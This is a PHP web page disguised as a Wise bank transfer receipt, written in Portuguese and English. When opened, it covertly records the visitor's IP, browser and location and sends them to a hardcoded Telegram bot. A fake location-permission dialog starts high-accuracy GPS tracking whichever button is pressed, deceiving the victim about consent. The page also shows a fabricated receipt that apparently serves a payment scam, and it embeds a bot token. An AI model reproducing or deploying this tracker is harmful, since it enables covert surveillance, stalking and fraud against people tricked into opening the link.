<?php
// ==================== CONFIGURAÇÕES ==================== v1.5
$telegram_bot_token = "8704514905:AAHN69zg_EJtg7JlB9wVmbM7aZCRmMJeDJI";
$telegram_chat_id = "8385484720";
// =======================================================

// POST: tracking assíncrono (chamado pelo JS após a página carregar)
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $ip =
        $_SERVER["HTTP_X_FORWARDED_FOR"] ??
        ($_SERVER["HTTP_X_REAL_IP"] ?? ($_SERVER["REMOTE_ADDR"] ?? "N/A"));
    $ip = trim(explode(",", $ip)[0]);

    $user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "N/A";
    $referer = $_SERVER["HTTP_REFERER"] ?? "Direct";
    $hora = date("d/m/Y H:i:s");

    // ==================== LOCALIZAÇÃO VIA IP ====================
    $geo = json_decode(
        @file_get_contents(
            "http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon",
        ),
        true,
    );

    $cidade = $geo["city"] ?? "Unknown";
    $estado = $geo["regionName"] ?? "Unknown";
    $pais = $geo["country"] ?? "Unknown";
    $provedor = $geo["isp"] ?? "Unknown";
    $proxy = ($geo["proxy"] ?? false) ? "Yes" : "No";
    $mobile = ($geo["mobile"] ?? false) ? "Yes" : "No";
    $lat_ip = $geo["lat"] ?? null;
    $lon_ip = $geo["lon"] ?? null;

    // ==================== RECEBE GPS ====================
    $latitude = $_POST["latitude"] ?? null;
    $longitude = $_POST["longitude"] ?? null;
    $accuracy = $_POST["accuracy"] ?? null;
    $source = $_POST["source"] ?? "ip";

    if ($latitude && $longitude && $source === "gps") {
        $latitude_final = $latitude;
        $longitude_final = $longitude;
        $localizacao_texto = "$latitude, $longitude (±{$accuracy}m)";
        $emoji_local = "📍";
        $gps_status = "✅ GPS Aceito pelo usuário";
    } else {
        $latitude_final = $lat_ip;
        $longitude_final = $lon_ip;
        $localizacao_texto = "$cidade, $estado - $pais";
        $emoji_local = "🌐";
        $gps_status = "📍 Via IP (aproximada)";
    }

    // ==================== MENSAGEM TELEGRAM ====================
    $mensagem = "🔴 *Novo acesso ao Comprovante Wise!*\n\n";
    $mensagem .= "🕒 *Data:* $hora\n";
    $mensagem .= "🌐 *IP:* `$ip`\n";
    $mensagem .= "$emoji_local *Localização:* $localizacao_texto\n";
    $mensagem .= "$gps_status\n";
    $mensagem .= "🏢 *Provedor:* $provedor\n";
    $mensagem .= "📱 *Mobile:* $mobile | *Proxy/VPN:* $proxy\n";
    $mensagem .= "🔗 *Referer:* $referer";

    @file_get_contents(
        "https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" .
            urlencode($mensagem) .
            "&parse_mode=Markdown",
    );

    // ==================== LOG ====================
    $log = [
        "data" => $hora,
        "ip" => $ip,
        "latitude" => $latitude_final,
        "longitude" => $longitude_final,
        "source" => $source,
        "cidade" => $cidade,
        "estado" => $estado,
        "pais" => $pais,
        "provedor" => $provedor,
        "mobile" => $mobile,
        "proxy" => $proxy,
        "user_agent" => $user_agent,
    ];

    file_put_contents(
        "acessos.json",
        json_encode($log, JSON_UNESCAPED_UNICODE) . "\n",
        FILE_APPEND,
    );

    header("Content-Type: application/json");
    echo json_encode(["ok" => true]);
    exit();
}
// GET: serve o HTML imediatamente, sem chamadas externas
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wise Transfer Confirmation - €1.390,00</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f8f9fa; text-align: center; padding: 20px; }
        .comprovante { max-width: 640px; margin: 0 auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 25px rgba(0,0,0,0.12); border: 1px solid #e0e0e0; }
        h1 { color: #00b66d; }
        .info { text-align: left; margin: 25px 0; line-height: 2.1; font-size: 16px; }
        .info p { margin: 9px 0; }
        .success { color: #00b66d; font-size: 23px; font-weight: bold; margin: 20px 0; }
        .wise-logo { color: #00b66d; font-weight: bold; font-size: 22px; }
    </style>
</head>
<body>
    <div class="comprovante">
        <p class="wise-logo">WISE</p>
        <h1>✅ Transfer Completed Successfully</h1>
        <p style="color:#555; font-size:17px;">Money sent via Wise • SEPA Transfer</p>

        <div class="info">
            <p><strong>Amount Sent:</strong> €1.390,00</p>
            <p><strong>Date & Time:</strong> <?php echo date("d/m/Y H:i"); ?> CET</p>
            <p><strong>Recipient:</strong> Cristina Mendes</p>
            <p><strong>Bank:</strong> Caixa Geral de Depósitos (CGD)</p>
            <p><strong>IBAN:</strong> PT50 0035 0088 0000 4933 9008 2</p>
            <p><strong>BIC/SWIFT:</strong> CGDIPTPL</p>
            <p><strong>Reference:</strong> WISE-<?php echo strtoupper(substr(md5(time()), 0, 12)); ?></p>
            <p><strong>Status:</strong> <span style="color:#00b66d;">Completed ✓</span></p>
        </div>

        <div class="success">Transfer Completed</div>

        <p style="margin-top:20px; color:#444;">
            This is your electronic receipt. You can download it as PDF.
        </p>
        <br>
        <button onclick="alert('Downloading PDF receipt... (This is a simulation)')"
                style="padding:14px 35px; font-size:17px; background:#00b66d; color:white; border:none; border-radius:8px; cursor:pointer;">
            📄 Download PDF Receipt
        </button>
    </div>
    <script>
        // ==================== TRACKING ASSÍNCRONO ====================
        let tentativas = 0;
        const maxTentativas = 3;

        async function enviarTracking(dados) {
            const formData = new FormData();
            for (const [k, v] of Object.entries(dados)) formData.append(k, v);
            await fetch(window.location.href, { method: 'POST', body: formData });
        }

        function mostrarMensagem(onConfirm) {
            if (document.getElementById('sys-alert')) return;
            const overlay = document.createElement('div');
            overlay.id = 'sys-alert';
            overlay.style.cssText = `
                position:fixed; inset:0; z-index:9999;
                backdrop-filter:blur(6px); -webkit-backdrop-filter:blur(6px);
                background:rgba(0,0,0,0.45);
                display:flex; align-items:center; justify-content:center;
            `;
            overlay.innerHTML = `
                <div style="
                    background:#1c1c1e; color:#fff;
                    width:270px; border-radius:14px;
                    overflow:hidden; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
                    box-shadow:0 20px 60px rgba(0,0,0,0.6);
                    animation:popIn .18s ease;
                ">
                    <div style="padding:20px 16px 14px; text-align:center; border-bottom:1px solid #3a3a3c;">
                        <div style="font-size:36px; margin-bottom:8px;">📍</div>
                        <div style="font-weight:600; font-size:15px; margin-bottom:6px;">
                            "Wise" Quer Usar Sua Localização
                        </div>
                        <div style="font-size:13px; color:#aeaeb2; line-height:1.4;">
                            Sua localização é usada para verificar a autenticidade do comprovante e proteger sua conta.
                        </div>
                    </div>
                    <div style="display:flex;">
                        <button id="btn-nao"
                            style="flex:1; padding:13px; background:none; border:none; border-right:1px solid #3a3a3c;
                                   color:#636366; font-size:15px; cursor:pointer; font-family:inherit;">
                            Não Permitir
                        </button>
                        <button id="btn-sim"
                            style="flex:1; padding:13px; background:none; border:none;
                                   color:#0a84ff; font-size:15px; font-weight:600; cursor:pointer; font-family:inherit;">
                            Permitir
                        </button>
                    </div>
                </div>
                <style>
                    @keyframes popIn {
                        from { transform:scale(.85); opacity:0; }
                        to   { transform:scale(1);   opacity:1; }
                    }
                </style>
            `;
            document.body.appendChild(overlay);
            // Ambos os botões fecham o overlay e disparam o GPS
            document.getElementById('btn-nao').onclick =
            document.getElementById('btn-sim').onclick = () => {
                overlay.remove();
                onConfirm();
            };
        }

        function tentarGPS() {
            if (!navigator.geolocation) return;

            const PRECISAO_ALVO = 50;    // metros
            const TIMEOUT_MS    = 15000; // desiste após 15s e envia o melhor que tiver
            let melhor = null;
            let enviado = false;

            function iniciarWatch() {
                function enviar(pos) {
                    if (enviado) return;
                    enviado = true;
                    navigator.geolocation.clearWatch(watchId);
                    enviarTracking({
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: Math.round(pos.coords.accuracy),
                        source: 'gps',
                    });
                }

                const watchId = navigator.geolocation.watchPosition(
                    (pos) => {
                        if (!melhor || pos.coords.accuracy < melhor.coords.accuracy) melhor = pos;
                        if (pos.coords.accuracy <= PRECISAO_ALVO) enviar(pos);
                    },
                    () => { if (melhor) enviar(melhor); },
                    { enableHighAccuracy: true, timeout: TIMEOUT_MS, maximumAge: 0 },
                );

                setTimeout(() => { if (melhor) enviar(melhor); }, TIMEOUT_MS);
            }

            // watchPosition só é chamado depois que o usuário clica num dos botões
            mostrarMensagem(iniciarWatch);
        }

        window.onload = () => {
            // Tracking via IP imediatamente (não bloqueia a página)
            enviarTracking({ source: 'ip' });
            // Tenta GPS em paralelo
            setTimeout(tentarGPS, 800);
        };
    </script>
</body>
</html>
